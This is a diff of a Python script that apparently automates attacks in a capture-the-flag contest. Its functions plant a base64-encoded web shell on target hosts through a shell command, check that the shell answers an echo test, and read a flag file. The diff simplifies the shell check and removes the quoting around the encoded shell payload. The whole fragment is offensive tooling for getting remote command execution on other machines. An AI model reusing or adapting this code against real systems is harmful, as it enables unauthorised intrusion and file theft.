@@ -120,18 +120,10 @@ def execute_shell(target,target_port,cmd):
 
 def check_shell(target,target_port,cmd):
     shell_name,shell_arg = shell_hash(target,target_port)
-    if shell_type==1:
-	res = execute_shell(target,target_port,"echo hell0W0r1d")
-	if "hell0W0r1d" in res:
-	    return True
-	return False    
-    if shell_type==2:
-	try:
-	    res = visit_shell(target,target_port,"")
-	except Exception:
-	    return "timeout" 
-	return res
-    return True
+    res = execute_shell(target,target_port,"echo hell0W0r1d")
+    if "hell0W0r1d" in res:
+	return True
+    return False    
 
 def visit_shell(target,target_port,cmd):
     shell_name,shell_arg = shell_hash(target,target_port)
@@ -187,7 +179,7 @@ def generate_shell(target,target_port,cmd,shell_type=2):
 
 def get_shell(target,target_port,cmd):
     shell_name,shell,encode_shell = generate_shell(target,target_port,cmd)
-    return  "/bin/echo " + quote(encode_shell) + " | /usr/bin/base64 -d | /bin/cat > " + shell_absolute_path + "/" + shell_name 
+    return  "/bin/echo " + encode_shell + " | /usr/bin/base64 -d | /bin/cat > " + shell_absolute_path + "/" + shell_name 
 
 def get_flag(target,target_port,cmd):
     return "/bin/cat " + flag_path
